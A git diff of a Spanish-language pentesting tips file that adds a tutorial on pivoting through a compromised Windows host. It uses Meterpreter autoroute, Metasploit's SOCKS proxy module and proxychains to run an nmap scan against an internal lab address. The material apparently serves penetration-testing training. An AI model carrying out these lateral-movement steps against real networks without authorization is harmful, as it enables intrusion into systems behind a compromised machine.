@@ -132,15 +132,133 @@ Esta herramienta esta disponible aqui -> https://github.com/lijiejie/GitHack
 
 ## Tip #6: Pivoting con metasploit
 Se le conoce como pivoting a la tecnica en la cual utilizas una maquina intermedia que tiene conectividad en dos segmentos de red para hacer llegar ataques desde tu maquina original, el esquema lo explica mejor:
-[Meter esquema aqui]
-Para realizar esto es importante primero obtener una sesión de meterpreter en la maquina pivote, una vez hecho esto, procederemos a añadir la ruta:
+[Pivote](./img/pivoteo.png)
+
+Lo primero que debemos observar es que la IP de nuestra maquina de atacante es la ```10.10.48.3```:
+````bash
+root@pentest:~# ip address
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
+    link/ipip 0.0.0.0 brd 0.0.0.0
+97188: eth1@if97189: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:0a:0a:30:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.10.48.3/24 brd 10.10.48.255 scope global eth1
+       valid_lft forever preferred_lft forever
+```
+Para realizar el pivoteo es importante primero obtener una sesión de meterpreter en la maquina pivote, una vez hecho esto, veremos su configuaración de IPs:
 ```bash
+meterpreter > shell
+Process 2972 created.
+Channel 1 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::174:4cdc:e7b7:58d4%13
+   IPv4 Address. . . . . . . . . . . : 10.3.17.190
+   Subnet Mask . . . . . . . . . . . : 255.255.240.0
+   Default Gateway . . . . . . . . . : 10.3.16.1
+```
+Como podemos observar la IP es ```10.3.17.190``` con una mascara de subnet ```255.255.240.0``` el gateway ```10.3.16.1```, lo que nos indica que se encuentra en un segmento diferente, si realizamos un ping hasta la IP ```10.3.29.55``` observamos su respuesta:
+```bash
+C:\Windows\system32>ping -n 1 10.3.29.55
+ping -n 1 10.3.29.55
+
+Pinging 10.3.29.55 with 32 bytes of data:
+Reply from 10.3.29.55: bytes=32 time<1ms TTL=128
+
+Ping statistics for 10.3.29.55:
+    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+```
+Si intentamos un ping desde nuestra maquina de atacante no obtendremos respuesta:
+```bash
+root@pentest:~# ping -c 1 10.3.29.55
+PING 10.3.29.55 (10.3.29.55) 56(84) bytes of data.
+
+--- 10.3.29.55 ping statistics ---
+1 packets transmitted, 0 received, 100% packet loss, time 0ms
+```
+Esto indica que tenemos que utilizar la maquina que tiene conexion a la red ```10.10.48.0/24``` y a la red ```10.3.0.0/20```, que en este caso tambien es la maquina en la que tenemos nuestra sesion de meterpreter, para realizar el pivoting debemos agregar las rutas con el siguiente comando:
+```bash
+meterpreter > run autoroute -s 10.3.29.55/20
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 10.3.29.55/255.255.240.0...
+[+] Added route to 10.3.29.55/255.255.240.0 via 10.3.17.190
+[*] Use the -p option to list all active routes
+```
+Ahora veremos la configuracion del archivo de proxychains en nuestra maquina de atacante, vemos que el protocolo es ```socks4``` y el puerto es el ```9050```:
+```bash
+root@pentest:~# tail /etc/proxychains4.conf
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4  127.0.0.1 9050
+```
+Ahora en la maquina con la sesión de meterpreter abierta utilizaremos el auxiliar ```auxiliary/server/socks_proxy``` y modificaremos las opciones ```SRVPORT``` y ```VERSION```:
+```bash
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/psexec) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+SRVPORT => 9050
+msf6 auxiliary(server/socks_proxy) > set VERSION 4a
+VERSION => 4a
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 0.
+
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) > jobs
+
+Jobs
+====
+
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  0   Auxiliary: server/socks_proxy
 
 ```
-Ahora con el auxiliar ```nombre del auxiliar``` y con el archivo de configuracion de ```proxichains``` los configuraremos para que utilizen el mismo puerto:
-
 Ahora si podemos utilizar nuestra maquina para explotar la maquina no visible a traves de la maquina pivote, aqui se realiza el escaneo de puertos con ```nmap```:
+```bash
+root@pentest:~# proxychains nmap -p445 -n -v -Pn -sS 10.3.29.55
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.15
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-01-12 20:45 IST
+Initiating SYN Stealth Scan at 20:45
+Scanning 10.3.29.55 [1 port]
+Completed SYN Stealth Scan at 20:45, 2.02s elapsed (1 total ports)
+Nmap scan report for 10.3.29.55
+Host is up.
 
+PORT    STATE    SERVICE
+445/tcp open microsoft-ds
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
+```
+Ahora todas las herramientas que queramos  utilizar solo haremos uso de proxychains para enviarlas a la maquina de la red interna.
 ## Tip #7: Uso de smbclient con el hash NTLM
 ## Tip #8: Acceso a cualquier archivo en Windows con SeBackupPrivilege
 ## Tip #9: Port Forwarding y pivoting desde metasploit
